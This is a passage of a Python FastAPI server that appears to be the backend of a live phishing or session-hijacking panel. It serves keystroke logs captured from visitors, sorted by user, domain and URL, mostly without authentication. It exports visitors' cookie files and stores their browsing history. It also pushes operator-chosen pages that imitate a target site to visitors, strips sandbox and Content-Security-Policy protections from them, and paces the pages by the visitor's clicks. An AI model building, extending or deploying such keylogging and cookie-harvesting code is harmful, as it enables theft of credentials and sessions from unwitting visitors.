        # offline snapshot when only a hidden/admin session was present; those
        # sessions intentionally coexist with the public runtime.
        if replaced:
            try:
                await save_client_profile(parent_id, {
                    "client_id": runtime_id or parent_id,
                    "user_id": parent_id,
                    "parent_client_id": parent_id,
                    "current_url": "",
                    "status": "offline",
                    "is_online": False,
                    "disconnected_at": time.time(),
                })
            except Exception:
                logger.debug("[WS] pre-connect profile release write failed", exc_info=True)

        # Return the workflow branding in the pre-connect response too. This
        # lets the client paint the correct spinner before the WebSocket boot
        # message arrives, instead of flashing the target site's default color.
        workflow_id = str(body.get("workflow_id") or body.get("workflow") or "").strip()
        if not workflow_id:
            try:
                workflow_id = str(srv_settings.get_settings().auto_workflow_id or "").strip()
            except Exception:
                workflow_id = ""
        workflow_meta = {}
        if workflow_id:
            try:
                workflow = lpv_store.get_workflow(workflow_id) or {}
                workflow_meta = {
                    "id": workflow.get("id", workflow_id),
                    "name": workflow.get("name", "") or "",
                    "brand_logo_url": workflow.get("brand_logo_url", "") or "",
                    "brand_color": workflow.get("brand_color", "") or "",
                }
            except Exception:
                workflow_meta = {}

        return JSONResponse({
            "success": True,
            "parent_client_id": parent_id,
            "runtime_id": runtime_id,
            "replaced": int(replaced),
            "locked": bool(locked_by),
            "locked_session_id": locked_by,
            "workflow": workflow_meta,
        })
    except Exception as exc:
        logger.warning("[WS] pre-connect session release failed: %s", exc, exc_info=True)
        return JSONResponse({"error": "session release failed"}, status_code=500)


@app.get("/api/admin/sessions")
async def get_all_sessions():
    """Get all stored sessions from server"""
    try:
        await load_server_sessions()
        async with server_sessions_lock:
            sessions = copy.deepcopy(server_sessions)
        return JSONResponse({
            "sessions": sessions,
            "count": len(sessions),
            "loaded_at": datetime.now().isoformat()
        })
    except Exception as e:
        logger.error(f"Error getting sessions: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.get("/api/admin/sessions/{client_id}")
async def get_session(client_id: str):
    """Get a specific session from server"""
    try:
        session = await get_session_from_server(client_id)
        if not session:
            canonical_id = _canonical_profile_id(client_id)
            if canonical_id != client_id:
                session = await get_session_from_server(canonical_id)
        if session:
            return JSONResponse({"session": session})
        return JSONResponse({"error": "Session not found"}, status_code=404)
    except Exception as e:
        logger.error(f"Error getting session: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.delete("/api/admin/sessions")
async def clear_all_sessions(request: Request):
    """Clear all sessions from server storage"""
    # Verify admin authentication
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    
    try:
        global server_sessions, server_sessions_loaded
        async with server_sessions_lock:
            server_sessions.clear()
            server_sessions_loaded = True
            success = await _save_server_sessions_locked()
        
        if success:
            # Broadcast clear to all admins
            for ws in admin_ws_connections:
                try:
                    await ws.send_json({"type": "sessions_cleared"})
                except Exception:
                    pass
        
        return JSONResponse({"success": True, "message": "All sessions cleared"})
    except Exception as e:
        logger.error(f"Error clearing sessions: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


# ==============================
# Client Profile Management Endpoints
# Server-side profile storage for admin synchronization
# ==============================

@app.get("/api/admin/profiles")
async def get_all_profiles(request: Request):
    """Get all client profiles from server storage"""
    try:
        profiles = await get_all_client_profiles()
        return JSONResponse({
            "profiles": profiles,
            "count": len(profiles),
            "timestamp": time.time()
        })
    except Exception as e:
        logger.error(f"Error getting profiles: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.get("/api/admin/profiles/{client_id}")
async def get_profile(client_id: str, request: Request):
    """Get a specific client profile from server storage"""
    try:
        profile = await get_client_profile(client_id)
        if profile:
            return JSONResponse({"profile": profile})
        return JSONResponse({"error": "Profile not found"}, status_code=404)
    except Exception as e:
        logger.error(f"Error getting profile: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.post("/api/admin/profiles/sync")
async def sync_profiles(request: Request):
    """Sync profiles from admin with server storage (bidirectional sync)"""
    try:
        body = await request.json()
        admin_profiles = body.get('profiles', {})
        
        # Get server profiles
        server_profiles = await get_all_client_profiles()
        
        # Merge: server data takes precedence for conflicts, but admin data adds new entries
        merged_profiles = dict(server_profiles)
        
        for client_id, admin_data in admin_profiles.items():
            if client_id not in merged_profiles:
                # New profile from admin - add to server
                merged_profiles[client_id] = admin_data
            else:
                # Existing profile - merge both sides
                server_data = merged_profiles[client_id]
                server_time = server_data.get('last_updated', 0)
                admin_time = admin_data.get('last_updated', 0)
                
                # Merge history arrays from both sides
                server_history = server_data.get('history', [])
                admin_history = admin_data.get('history', [])
                
                merged_history = list(server_history)
                if admin_history:
                    # Add admin history entries that aren't in server
                    server_history_urls = set(h.get('url', '') + str(h.get('timestamp', '')) for h in server_history)
                    for h in admin_history:
                        key = h.get('url', '') + str(h.get('timestamp', ''))
                        if key not in server_history_urls:
                            merged_history.append(h)
                
                # Create merged profile
                merged_profile = {**server_data, **admin_data, 'history': merged_history}
                
                # If admin has newer last_seen, use that
                if admin_time > server_time:
                    merged_profile['last_seen'] = admin_data.get('last_seen', server_data.get('last_seen'))
                
                merged_profiles[client_id] = merged_profile
        
        # Save merged profiles under canonical durable parent ids. This also
        # folds old admin-local random session keys into the same profile.
        merged_profiles = _normalize_profile_store(merged_profiles)
        async with _client_profiles_lock:
            global _server_client_profiles
            _server_client_profiles = merged_profiles
            await _save_profiles_to_disk(merged_profiles)
        
        return JSONResponse({
            "success": True,
            "profiles": merged_profiles,
            "count": len(merged_profiles)
        })
    except Exception as e:
        logger.error(f"Error syncing profiles: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.delete("/api/admin/profiles/{client_id}")
async def delete_profile(client_id: str, request: Request):
    """Delete a client profile from server storage"""
    try:
        async with _client_profiles_lock:
            canonical_id = _canonical_profile_id(client_id)
            delete_id = canonical_id if canonical_id in _server_client_profiles else client_id
            if delete_id in _server_client_profiles:
                del _server_client_profiles[delete_id]
                await _save_profiles_to_disk(_server_client_profiles)
                return JSONResponse({"success": True, "message": "Profile deleted"})
            return JSONResponse({"error": "Profile not found"}, status_code=404)
    except Exception as e:
        logger.error(f"Error deleting profile: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.delete("/api/admin/profiles")
async def clear_all_profiles(request: Request):
    """Clear all client profiles from server storage"""
    try:
        async with _client_profiles_lock:
            global _server_client_profiles
            _server_client_profiles = {}
            await _save_profiles_to_disk({})
        
        return JSONResponse({"success": True, "message": "All profiles cleared"})
    except Exception as e:
        logger.error(f"Error clearing profiles: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


# ==============================
# Key Logger (KLG) API Endpoints
# Access keylog data organized by user and URL
# ==============================

@app.get("/api/klg/users")
async def get_klg_users():
    """Get list of all users with keylogs"""
    try:
        from session import get_keylog_users
        users = get_keylog_users()
        return JSONResponse({
            "users": users,
            "count": len(users)
        })
    except Exception as e:
        logger.error(f"Error getting KLG users: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.get("/api/klg/users/{user_id}")
async def get_klg_user(user_id: str):
    """Get keylog summary for a specific user"""
    try:
        from session import get_keylog_users, get_keylog_domains
        users = get_keylog_users()
        user_info = next((u for u in users if u["user_id"] == user_id), None)
        if not user_info:
            return JSONResponse({"error": "User not found"}, status_code=404)
        
        domains = get_keylog_domains(user_id)
        
        return JSONResponse({
            "user_id": user_id,
            "info": user_info,
            "domains": domains,
            "domain_count": len(domains)
        })
    except Exception as e:
        logger.error(f"Error getting KLG user: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.get("/api/klg/users/{user_id}/domains")
async def get_klg_domains(user_id: str):
    """Get list of domains with keylogs for a specific user"""
    try:
        from session import get_keylog_domains
        domains = get_keylog_domains(user_id)
        return JSONResponse({
            "user_id": user_id,
            "domains": domains,
            "count": len(domains)
        })
    except Exception as e:
        logger.error(f"Error getting KLG domains: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.get("/api/klg/users/{user_id}/domains/{domain}")
async def get_klg_domain_urls(user_id: str, domain: str):
    """Get list of URLs with keylogs for a specific user and domain"""
    try:
        from session import get_keylog_urls
        urls = get_keylog_urls(user_id, domain)
        return JSONResponse({
            "user_id": user_id,
            "domain": domain,
            "urls": urls,
            "count": len(urls)
        })
    except Exception as e:
        logger.error(f"Error getting KLG domain URLs: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.get("/api/klg/users/{user_id}/urls")
async def get_klg_url_logs(user_id: str, url: str = None):
    """Get keylogs for a specific user, optionally filtered by URL"""
    try:
        from session import get_keylog_for_url, get_keylog_urls
        
        if url:
            # Get logs for specific URL
            logs = get_keylog_for_url(user_id, url)
            return JSONResponse({
                "user_id": user_id,
                "url": url,
                "logs": logs,
                "count": len(logs)
            })
        else:
            # Get summary of all URLs
            from urllib.parse import unquote
            # Return all domains and their URLs
            from session import get_keylog_domains
            domains = get_keylog_domains(user_id)
            all_urls = []
            for domain_data in domains:
                urls = get_keylog_urls(user_id, domain_data["domain"])
                all_urls.extend(urls)
            return JSONResponse({
                "user_id": user_id,
                "urls": all_urls,
                "count": len(all_urls)
            })
    except Exception as e:
        logger.error(f"Error getting KLG URL logs: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.delete("/api/klg/users/{user_id}")
async def clear_klg_user(user_id: str, request: Request):
    """Clear all keylogs for a specific user"""
    # Verify admin authentication
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    
    try:
        from session import clear_keylog_for_user
        success = await clear_keylog_for_user(user_id)
        if success:
            return JSONResponse({"success": True, "message": f"Keylogs cleared for user {user_id}"})
        return JSONResponse({"error": "User not found"}, status_code=404)
    except Exception as e:
        logger.error(f"Error clearing KLG user: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.delete("/api/klg")
async def clear_all_klg(request: Request):
    """Clear all keylogs"""
    # Verify admin authentication
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    
    try:
        from session import clear_all_keylogs
        await clear_all_keylogs()
        return JSONResponse({"success": True, "message": "All keylogs cleared"})
    except Exception as e:
        logger.error(f"Error clearing all KLG: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


# ==============================
# Fast Download Endpoint (Part 9)
# ==============================

@app.get("/api/profiles/{user_id}/download")
async def download_profile(user_id: str):
    """Download only the portable profile metadata files as a ZIP.

    The full browser tree remains available through the File Manager ZIP
    action. This profile-specific export intentionally contains only the
    durable files used for profile identity/cookie transfer.
    """
    try:
        if not session_manager:
            return JSONResponse({"error": "Session manager not initialized"}, status_code=500)
        
        profile_manager = getattr(session_manager, 'browser_manager', None)
        if not profile_manager:
            return JSONResponse({"error": "Profile manager not available"}, status_code=500)
        from pathlib import Path
        profile_root = _configured_profile_root(Path(__file__).parent.resolve())
        if (not user_id or user_id in {".", ".."} or "/" in user_id or "\\" in user_id):
            return JSONResponse({"error": "Invalid profile path"}, status_code=403)
        requested_path = (profile_root / user_id).resolve()
        if requested_path == profile_root or not _path_is_within(requested_path, profile_root):
            return JSONResponse({"error": "Invalid profile path"}, status_code=403)
        if not profile_manager.profile_manager.profile_exists(user_id):
            return JSONResponse({"error": "Profile not found"}, status_code=404)
        profile_path = profile_manager.profile_manager.get_user_profile_path(user_id).resolve()
        if not _path_is_within(profile_path, profile_root):
            return JSONResponse({"error": "Invalid profile path"}, status_code=403)

        # Release this profile through SessionManager before taking the
        # filesystem snapshot, rather than shutting down unrelated sessions.
        await _release_sessions_for_file_download(profile_path)

        # Create ZIP file synchronously (fast for small profiles)
        import asyncio
        import tempfile

        cache_dir = Path(__file__).parent / "cache"
        cache_dir.mkdir(parents=True, exist_ok=True)

        zip_path = cache_dir / f"{user_id}_{uuid.uuid4().hex}_profile.zip"

        def create_zip_sync():
            from browser_manager import _profile_io_lock
            # Hold only this parent's lock while taking the small metadata
            # snapshot; unrelated profiles remain fully concurrent.
            allowed_files = ("cookies.json", "About.txt", "meta.json")
            with _profile_io_lock(profile_path):
                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for file_name in allowed_files:
                        file_path = profile_path / file_name
                        if (not file_path.is_file()
                                or file_path.is_symlink()
                                or not _path_is_within(file_path, profile_path)):
                            continue
                        zipf.write(file_path, file_name)

        
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, create_zip_sync)
        
        if not zip_path.exists():
            return JSONResponse({"error": "Failed to create ZIP"}, status_code=500)
        
        return FileResponse(
            zip_path,
            filename=f"{user_id}_profile.zip",
            media_type="application/zip"
        )
        
    except Exception as e:
        logger.error(f"Error downloading profile: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


# ==============================
# Server Info Endpoints
# ==============================

@app.get("/api/server/info")
async def server_info():
    """Get server information"""
    try:
        import platform
        from pathlib import Path
        
        base_dir = Path(__file__).parent
        
        memory_total = None
        if PSUTIL_AVAILABLE:
            try:
                memory_total = psutil.virtual_memory().total
            except Exception as e:
                logger.error(f"[System Info Error] Failed to get memory info: {e}")
        
        return JSONResponse({
            "os": platform.system(),
            "os_version": platform.version(),
            "python_version": platform.python_version(),
            "hostname": platform.node(),
            "cpu_count": os.cpu_count(),
            "memory_total": memory_total,
            "storage_free": shutil.disk_usage(base_dir).free,
            "project_path": str(base_dir)
        })
    except Exception as e:
        logger.error(f"Error getting server info: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.post("/api/server/restart")
async def server_restart():
    """
    Restart the server gracefully.
    Closes all sessions and triggers a server restart.
    """
    try:
        if server_instance is None:
            return JSONResponse({"error": "Server instance not available"}, status_code=500)
        
        # Trigger the restart
        asyncio.create_task(server_instance.restart())
        
        return JSONResponse({
            "success": True,
            "message": "Server restart initiated. All sessions will be closed."
        })
    except Exception as e:
        logger.error(f"Error restarting server: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


# ==============================
# LPV pushed-page sanitizer
# ==============================
#
# The operator has confirmed they trust every pushed page, so we strip
# client-side security knobs that would otherwise prevent inner scripts
# from running inside the LPV iframe. Three things are stripped:
#
#  1. ``sandbox="..."`` on every <iframe> (and bare ``sandbox``) —
#     without ``allow-scripts`` the iframe's own scripts (and its
#     descendants) are blocked. Chrome also reports
#         "Blocked script execution in 'about:srcdoc' because the
#          document's frame is sandboxed and the 'allow-scripts'
#          permission is not set."
#     for every nested sandboxed iframe the pushed page contains.
#  2. ``<meta http-equiv="Content-Security-Policy" ...>`` tags — a
#     meta CSP inside the iframe doc is intersected with the
#     server-side CSP and most-restrictive wins, so a strict meta CSP
#     in the saved HTML would re-block the data: / 'unsafe-eval'
#     scripts we just allowed.
#  3. ``<base href="...">`` tags — a base href in the pushed page
#     would silently redirect every relative resource load to a
#     third-party host (e.g. ``//evil.example.com/...``), which is a
#     known supply-chain pivot on captured pages.
#
# We use the stdlib ``html.parser.HTMLParser`` (SAX-style) rather than
# regex so that ``sandbox`` text content inside <script>, <style>, and
# <textarea> is preserved verbatim, and so that attribute-vs-text
# context is unambiguous. The function is idempotent — running it
# twice yields the same output.

from html.parser import HTMLParser as _StdHTMLParser  # noqa: E402


class _LPVSanitizer(_StdHTMLParser):
    """Strip sandbox / meta-CSP / base-href from pushed HTML.

    The output preserves everything else byte-for-byte (modulo the
    dropped tags/attributes), so script bodies, inline event
    handlers, styles, and the document's own text content all flow
    through untouched.
    """

    _VOID_TAGS = {
        "area", "base", "br", "col", "embed", "hr", "img",
        "input", "link", "meta", "param", "source", "track", "wbr",
    }
    _RAW_TEXT_TAGS = {"script", "style", "textarea", "title", "xmp"}

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self._out: list = []
        self._in_raw_text: Optional[str] = None  # tagname if inside raw text

    # -- public --------------------------------------------------------

    def get_output(self) -> str:
        return "".join(self._out)

    # -- helpers -------------------------------------------------------

    @staticmethod
    def _attr_value_safe(v: str) -> str:
        """Re-quote an attribute value for HTML output.

        The input parser already decodes entities; we re-encode the
        few characters that would break the quoting.
        """
        if '"' in v and "'" not in v:
            return f"'{v}'"
        if '"' in v or "'" in v:
            return f'"{v.replace(chr(34), "&quot;")}"'
        return f'"{v}"'

    def _attrs_to_str(self, attrs) -> str:
        parts = []
        for k, v in attrs:
            if k.lower() == "sandbox":
                # Strip the sandbox attribute entirely.
                continue
            if v is None:
                parts.append(k)
            else:
                parts.append(f"{k}={self._attr_value_safe(v)}")
        if not parts:
            return ""
        return " " + " ".join(parts)

    @staticmethod
    def _is_csp_meta(attrs) -> bool:
        for k, v in attrs:
            if k.lower() == "http-equiv" and v and v.lower().replace("-", "") == "contentsecuritypolicy":
                return True
        return False

    # -- parser callbacks ---------------------------------------------

    def handle_starttag(self, tag, attrs):
        tag_l = tag.lower()
        if tag_l == "meta" and self._is_csp_meta(attrs):
            return
        if tag_l == "base":
            # Record the dropped href so the serve endpoint can re-inject a
            # validated placeholder base — stripping it outright leaves the
            # blob: iframe with NO base, and relative URLs then resolve
            # against the VIEWER's origin (localhost works, tunnel breaks:
            # glued-host DNS errors via the ngrok edge).
            if getattr(self, "dropped_base_href", None) is None:
                for name, value in attrs:
                    if (name or "").lower() == "href" and value:
                        self.dropped_base_href = value.strip()
                        break
            return
        attr_str = self._attrs_to_str(attrs)
        self._out.append(f"<{tag}{attr_str}>")
        if tag_l in self._RAW_TEXT_TAGS:
            self._in_raw_text = tag_l

    def handle_startendtag(self, tag, attrs):
        tag_l = tag.lower()
        if tag_l == "meta" and self._is_csp_meta(attrs):
            return
        if tag_l == "base":
            if getattr(self, "dropped_base_href", None) is None:
                for name, value in attrs:
                    if (name or "").lower() == "href" and value:
                        self.dropped_base_href = value.strip()
                        break
            return
        attr_str = self._attrs_to_str(attrs)
        self._out.append(f"<{tag}{attr_str}/>")

    def handle_endtag(self, tag):
        tag_l = tag.lower()
        if tag_l in self._RAW_TEXT_TAGS and self._in_raw_text == tag_l:
            self._in_raw_text = None
        if tag_l in self._VOID_TAGS:
            return
        self._out.append(f"</{tag}>")

    def handle_data(self, data):
        # Inside <script>/<style> etc. we must NOT escape entities —
        # the raw text is meant to be the literal script body.
        self._out.append(data)

    def handle_entityref(self, name):
        self._out.append(f"&{name};")

    def handle_charref(self, name):
        self._out.append(f"&#{name};")

    def handle_comment(self, data):
        self._out.append(f"<!--{data}-->")

    def handle_decl(self, decl):
        self._out.append(f"<!{decl}>")

    def handle_pi(self, data):
        self._out.append(f"<?{data}>")


def _sanitize_lpv_html_with_base(html: str):
    """Like _sanitize_lpv_html but also returns the original <base href>
    the document carried (after validation). The sanitizer strips <base>
    to stop third-party pivots, but a base-less document rendered from a
    blob: URL resolves every relative reference against the VIEWER's
    origin -- which is exactly how the ngrok-glued-host DNS errors were
    born. We therefore keep the validated original base so the caller can
    re-inject it safely."""
    if not html:
        return html, None
    try:
        parser = _LPVSanitizer()
        parser.feed(html)
        parser.close()
        out = parser.get_output()
    except Exception as e:
        logger.warning(f"[lpv] sanitizer failed, returning original: {e}")
        return html, None
    base = getattr(parser, "dropped_base_href", None)
    return out, base


def _validated_base_href(raw: Optional[str], html: str) -> Optional[str]:
    """Validate/normalize a base href for re-injection. Accepts only
    absolute http(s) URLs, strips userinfo/fragments, and forces a
    directory-style trailing slash. When ``raw`` is unusable, falls back to
    the origin of the first absolute URL found in the document (saved pages
    always contain absolute asset refs) so the blob document NEVER inherits
    the viewer's origin."""
    from urllib.parse import urlsplit, urlunsplit
    import re as _re

    def _clean(u: str, directory: bool) -> Optional[str]:
        try:
            parts = urlsplit(u.strip())
        except Exception:
            return None
        if parts.scheme not in ("http", "https") or not parts.hostname:
            return None
        host = parts.hostname
        if len(host) > 253 or any(c in host for c in " /\\'\"@#$%^&*"):
            return None
        netloc = host
        if parts.port:
            netloc = f"{host}:{parts.port}"
        path = parts.path or "/"
        if directory:
            if not path.endswith("/"):
                path = path.rsplit("/", 1)[0] + "/"
        else:
            path = "/"
        return urlunsplit((parts.scheme, netloc, path, "", ""))

    if raw:
        cleaned = _clean(raw, directory=True)
        if cleaned:
            return cleaned
    m = _re.search(r"https?://[^\"'<>\s)]+", html or "")
    if m:
        return _clean(m.group(0), directory=False)
    return None


_BASE_TAG_RE = __import__("re").compile(r"<base[^>]*>", __import__("re").IGNORECASE)


def _inject_base_into_html(html: str, base_href: str) -> str:
    """Insert <base href="..."> as the FIRST child of <head> (or right after
    <html>, or prepend). Existing base tags are removed first. The href
    comes from _validated_base_href so it is always a clean absolute URL."""
    import re as _re
    html = _BASE_TAG_RE.sub("", html, count=1)
    tag = '<base href="' + base_href.replace('"', "%22") + '">'
    m = _re.search(r"<head[^>]*>", html, _re.IGNORECASE)
    if m:
        return html[:m.end()] + tag + html[m.end():]
    m = _re.search(r"<html[^>]*>", html, _re.IGNORECASE)
    if m:
        return html[:m.end()] + tag + html[m.end():]
    return tag + html


def _sanitize_lpv_html(html: str) -> str:
    """Return a copy of ``html`` with sandbox / meta-CSP / base-href stripped.

    See the block comment above for the rationale. If the parser
    raises (truly malformed HTML), the original HTML is returned
    untouched so a sanitizer bug can never break a real upload.
    """
    if not html:
        return html
    original_len = len(html)
    try:
        parser = _LPVSanitizer()
        parser.feed(html)
        parser.close()
        out = parser.get_output()
    except Exception as e:
        logger.warning(f"[lpv] sanitizer failed, returning original: {e}")
        return html
    new_len = len(out)
    if new_len != original_len:
        logger.debug(
            "[lpv] sanitized pushed HTML: %d -> %d bytes (-%d)",
            original_len, new_len, original_len - new_len,
        )
    return out


# ==============================
# LPV (Live Panel Version) — REST endpoints
# ==============================
#
# Round 1 surface area:
#   - Archive: upload / list / search / fetch / delete HTML pages
#   - Session: read the active LPV session + current page for a client
#   - Audit:   read recent events for a client
# Page push + event capture happen over the existing WebSocket (see
# /admin and /ws handlers below).


@app.get("/api/lpv/health")
async def lpv_health():
    """Cheap endpoint the admin UI uses to confirm LPV is wired up."""
    return {"ok": True, "ts": time.time()}


# ---------------------------------------------------------------------------
# Runtime server settings
# ---------------------------------------------------------------------------
# These endpoints back the "Server Settings" tab in Admin.html.  The
# flags are read at runtime by dom_capture, the WS connect path, and
# LPV page rendering.  See server_settings.py for the full schema.


# ---------------------------------------------------------------------------
# LPV spinner event tracker
# ---------------------------------------------------------------------------
# A `redirect` workflow step is supposed to wait until the client clicks a
# button (which shows the in-page spinner) and *then* wait the configured
# number of seconds before pushing the next page.  The client side emits
# a `lpv_spinner` event every time the overlay spinner is shown, so the
# workflow runner can subscribe to that event per client.
#
# We use a tiny per-client pub/sub:
#   _lpv_spinner_subs[client_id] = list of asyncio.Event
# The LPV-only WS receive loop (and the regular session loop, if LPV
# overlay events flow through it) sets every event on a `lpv_spinner`
# inbound.  The workflow runner awaits one of these events after pushing
# a redirect step, with a configurable timeout (default: 30 s) so a
# client that never clicks doesn't stall the chain forever.

_lpv_spinner_subs: Dict[Tuple[str, Optional[str]], List["asyncio.Event"]] = {}

# LPV-only WebSocket registry for clients that have no browser session (lpv_only_mode)
_lpv_only_ws: Dict[str, Any] = {}
# runtime client_id -> durable per-person identity key.
#
# client_id is regenerated per tab, so keying chat on it alone makes every
# new tab look like a stranger and the thread starts empty. This maps the
# runtime id onto the client's persisted user id so the conversation (and
# the admin's thread list) groups by person. Runtime ownership is
# untouched — each tab still owns its own connection.
_lpv_identity: Dict[str, str] = {}
# Current websocket generation per stable LPV client id.  The id is durable
# for admin grouping; this token is ephemeral for ownership/isolation.
_lpv_connection_tokens: Dict[str, str] = {}
# One active LPV-only runtime per stable parent identity.  A new public
# workflow-link tab replaces the previous tab instead of becoming a second
# unrelated Admin client.
_lpv_parent_connections: Dict[str, Dict[str, Any]] = {}
_lpv_parent_handoff_locks: Dict[str, asyncio.Lock] = {}
_lpv_parent_handoff_guard = asyncio.Lock()

# runtime client_id -> 'mobile' | 'desktop'.
#
# A workflow references ONE page; a page can pair a phone build with a
# desktop build (see lpv_store.set_page_device). Which of the two a visitor
# receives depends on the device they connected with, so the server has to
# remember that per runtime. _remember_client_device() is called on every
# LPV connection; the fallbacks below cover browser sessions and a backend
# restart (the value is also persisted in the admin client record).
_lpv_client_devices: Dict[str, str] = {}

_MOBILE_UA_RE = re.compile(
    r"mobi|android|iphone|ipod|ipad|tablet|silk|kindle|opera mini|iemobile",
    re.IGNORECASE,
)


def _device_from_init(init_data: Optional[Dict[str, Any]]) -> str:
    """'mobile' | 'desktop' for a client's boot payload (missing -> desktop)."""
    data = init_data or {}
    if data.get("is_mobile"):
        return "mobile"
    ua = str(data.get("mobile_user_agent") or data.get("userAgent") or "")
    if ua and _MOBILE_UA_RE.search(ua):
        return "mobile"
    return "desktop"


def _remember_client_device(client_id: str, init_data: Optional[Dict[str, Any]]) -> str:
    """Record the visitor's device so later pushes resolve the right page."""
    device = _device_from_init(init_data)
    if client_id:
        _lpv_client_devices[client_id] = device
    return device


async def _client_device(client_id: str) -> str:
    """'mobile' | 'desktop' for an already connected client."""
    if not client_id:
        return "desktop"
    known = _lpv_client_devices.get(client_id)
    if known in ("mobile", "desktop"):
        return known
    record: Dict[str, Any] = {}
    try:
        stored = server_sessions.get(client_id)
        if isinstance(stored, dict):
            record = stored
            if record.get("device") in ("mobile", "desktop"):
                _lpv_client_devices[client_id] = record["device"]
                return record["device"]
    except Exception:
        record = {}
    # A browser session knows its own device flag (set at admission).
    try:
        session = await session_manager.get_session(client_id) if session_manager else None
    except Exception:
        session = None
    if session is not None:
        if isinstance(session, dict):
            is_mobile = bool(session.get("is_mobile"))
        else:
            is_mobile = bool(getattr(session, "is_mobile", False))
        device = "mobile" if is_mobile else "desktop"
        _lpv_client_devices[client_id] = device
        return device
    if record:
        device = _device_from_init({"userAgent": record.get("user_agent")})
        _lpv_client_devices[client_id] = device
        return device
    return "desktop"


async def _page_for_client(
    client_id: str, page_id: str
) -> Tuple[Optional[Dict[str, Any]], str, str]:
    """Resolve the page a specific visitor should receive.

    Returns ``(page, served_page_id, device)``. Pages without a device pair
    resolve to themselves, so nothing changes for existing workflows.
    """
    device = await _client_device(client_id)
    try:
        page, swapped_from = lpv_store.resolve_page_for_device(page_id, device)
    except Exception:
        logger.debug("[LPV] device variant resolution failed for %s", page_id, exc_info=True)
        page, swapped_from = lpv_store.get_page(page_id), ""
    if not page:
        return None, page_id, device
    served_id = str(page.get("id") or page_id)
    if swapped_from:
        logger.debug(
            "[LPV] %s visitor: serving page %s instead of %s",
            device, served_id, swapped_from,
        )
    return page, served_id, device


@asynccontextmanager
async def _lpv_parent_handoff(parent_id: str):
    """Hold the stable-parent handoff lock across replacement and admission."""
    key = str(parent_id or "").strip()
    if not key:
        yield key
        return
    async with _lpv_parent_handoff_guard:
        lock = _lpv_parent_handoff_locks.get(key)
        if lock is None:
            lock = asyncio.Lock()
            _lpv_parent_handoff_locks[key] = lock
    async with lock:
        yield key


async def _replace_lpv_parent_connection(
    parent_id: str,
    *,
    exclude_client_id: Optional[str] = None,
    exclude_websocket: Any = None,
) -> int:
    """Serialize replacement handoffs for one stable LPV parent."""
    async with _lpv_parent_handoff(parent_id) as key:
        if not key:
            return 0
        return await _replace_lpv_parent_connection_locked(
            key,
            exclude_client_id=exclude_client_id,
            exclude_websocket=exclude_websocket,
        )


async def _replace_lpv_parent_connection_locked(
    parent_id: str,
    *,
    exclude_client_id: Optional[str] = None,
    exclude_websocket: Any = None,
) -> int:
    """Terminate an older LPV-only connection for one stable parent.

    The map is updated before the old socket is closed, so its finally block
    cannot mark the replacement offline or cancel the replacement workflow.
    The old record is explicitly marked offline first, then the socket close is
    awaited so the caller can safely start the new runtime.
    """
    key = str(parent_id or "").strip()
    if not key:
        return 0
    # Replace a browser runtime for the same parent as well.  This keeps a
    # workflow-link takeover and a normal client takeover symmetric. Respect
    # an explicit Admin lock rather than tearing down its owner.
    browser_replaced = 0
    if session_manager:
        try:
            locked_by = await session_manager.registry.get_locked_session_id(key)
            if locked_by and locked_by != exclude_client_id:
                return 0
        except Exception:
            pass
        try:
            browser_replaced = await session_manager.kick_previous_sessions(
                key,
                exclude_session_id=exclude_client_id,
                replace_existing=True,
            )
        except Exception:
            logger.debug("[profile] browser replacement failed for %s", key, exc_info=True)
    old = _lpv_parent_connections.get(key)
    if not old:
        return browser_replaced
    old_client_id = str(old.get("client_id") or "")
    old_ws = old.get("websocket")
    # A refresh normally reuses the same runtime client id, so the id alone
    # must not exclude this map entry. Only the exact websocket object can be
    # the current caller's connection.
    if exclude_websocket is not None and old_ws is exclude_websocket:
        return 0

    old_token = old.get("connection_token")
    old_init = dict(old.get("init_data") or {})
    old_workflow = dict(old.get("workflow") or {})
    # Stop accepting messages from the old generation immediately.
    if old_client_id:
        if _lpv_only_ws.get(old_client_id) is old_ws:
            _lpv_only_ws.pop(old_client_id, None)
        # Keep the old token through the offline write below; remove it
        # immediately afterward so all stale handlers fail their check.
        _lpv_spinner_signal(old_client_id, old_token)
        await _cancel_workflow_for_client(old_client_id, "replaced by fresh connection")
        try:
            await _upsert_lpv_admin_client(
                old_client_id,
                old_init,
                old_workflow,
                online=False,
                connection_token=old_token,
            )
        except Exception:
            logger.debug("[LPV] failed to mark replaced client offline %s", old_client_id, exc_info=True)
        if old_token and _lpv_connection_tokens.get(old_client_id) == old_token:
            _lpv_connection_tokens.pop(old_client_id, None)
        try:
            from browser_manager import unregister_profile_session
            unregister_profile_session(key, old_client_id)
        except Exception:
            logger.debug("[LPV] parent profile unregistration failed for %s", old_client_id, exc_info=True)
    if _lpv_parent_connections.get(key) is old:
        _lpv_parent_connections.pop(key, None)
    if old_ws is not None:
        try:
            try:
                await old_ws.send_json({
                    "type": "session_replaced",
                    "reason": "replaced_by_new_session",
                })
            except Exception:
                pass
            await old_ws.close(code=4001, reason="replaced_by_new_session")
        except Exception:
            pass
    return browser_replaced + 1


def _lpv_connection_is_current(client_id: str, connection_token: Optional[str]) -> bool:
